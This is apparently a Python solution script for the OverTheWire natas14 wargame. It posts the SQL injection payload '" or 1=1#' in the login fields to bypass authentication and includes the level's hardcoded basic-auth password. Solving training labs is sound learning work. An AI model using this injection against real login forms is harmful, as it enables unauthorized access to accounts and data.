import requests
from requests.auth	import HTTPBasicAuth

url = "http://natas14.natas.labs.overthewire.org/index.php"
username = "natas14"
password = "Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1"

session = requests.Session()

data ={
	"username":'" or 1=1#',
	"password":'" or 1=1#'
}

req = session.post(url, auth = HTTPBasicAuth(username, password), data = data)
print(req.text)